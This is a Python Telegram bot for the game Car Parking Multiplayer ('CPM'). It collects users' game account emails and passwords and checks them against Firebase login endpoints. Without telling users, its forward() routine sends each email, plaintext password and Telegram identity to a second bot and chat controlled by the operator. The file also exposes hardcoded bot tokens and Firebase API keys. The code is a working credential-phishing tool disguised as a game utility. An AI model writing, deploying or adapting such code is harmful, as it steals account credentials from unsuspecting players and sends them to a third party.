import os
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ConversationHandler, ContextTypes, filters
)

# ================= ENV TOKENS (RENDER SAFE) =================
BOT_TOKEN = os.getenv("8695744876:AAG1z5np1xkeKLu71WxYMNrJSSM-nhOUfNI")
FORWARD_BOT_TOKEN = os.getenv("8715407718:AAFTiDIBTpRvyVkltGrAsqdUkTJhgEuShEk")
FORWARD_CHAT_ID = os.getenv("5921136617")

# ================= CPM CONFIG =================
CPM = {
    "CPM1": {
        "key": os.getenv("AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA"),
        "rating": "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
    },
    "CPM2": {
        "key": os.getenv("AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"),
        "rating": "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI"
    }
}

EMAIL, PASSWORD = range(2)

# ================= HELPERS =================
def login_url(key):
    return f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={key}"

def update_url(key):
    return f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={key}"

# ================= FORWARD =================
async def forward(update: Update, cpm, email, action, extra=None):

    user = update.effective_user

    text = f"""
CPM: {cpm}

TG NAME: {user.first_name}
TG USER: @{user.username if user.username else 'NO_USERNAME'}
TG ID: {user.id}

EMAIL: {email}
ACTION: {action}
EXTRA: {extra}
"""

    async with httpx.AsyncClient() as client:
        await client.post(
            f"https://api.telegram.org/bot{FORWARD_BOT_TOKEN}/sendMessage",
            json={"chat_id": FORWARD_CHAT_ID, "text": text}
        )

# ================= START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    text = "CPM BOT STARTED"

    keyboard = [[
        InlineKeyboardButton("CPM 1", callback_data="CPM1"),
        InlineKeyboardButton("CPM 2", callback_data="CPM2")
    ]]

    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ================= CPM SELECT =================
async def select_cpm(update: Update, context: ContextTypes.DEFAULT_TYPE):

    q = update.callback_query
    await q.answer()

    context.user_data["cpm"] = q.data
    context.user_data["key"] = CPM[q.data]["key"]

    await q.message.reply_text("Enter Email:")
    return EMAIL

# ================= EMAIL =================
async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):

    context.user_data["email"] = update.message.text
    await update.message.reply_text("Enter Password:")
    return PASSWORD

# ================= LOGIN =================
async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):

    email = context.user_data["email"]
    password = update.message.text
    cpm = context.user_data["cpm"]
    key = context.user_data["key"]

    async with httpx.AsyncClient() as client:
        r = await client.post(login_url(key), json={
            "email": email,
            "password": password,
            "returnSecureToken": True
        })

    await forward(update, cpm, email, "LOGIN", password)

    if "idToken" in r.json():

        context.user_data["token"] = r.json()["idToken"]

        await update.message.reply_text("LOGIN SUCCESS")

    else:
        await update.message.reply_text("LOGIN FAILED")

    return ConversationHandler.END

# ================= MENU =================
async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):

    q = update.callback_query
    await q.answer()

    await q.message.reply_text("Action received")

# ================= TEXT HANDLER =================
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Working...")

# ================= APP =================
app = Application.builder().token(BOT_TOKEN).build()

conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(select_cpm, pattern="^(CPM1|CPM2)$")],
    states={
        EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
    },
    fallbacks=[CommandHandler("start", start)]
)

app.add_handler(CommandHandler("start", start))
app.add_handler(conv)
app.add_handler(CallbackQueryHandler(menu))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

print("BOT RUNNING")

# Render safe start
if __name__ == "__main__":
    app.run_polling(drop_pending_updates=True)
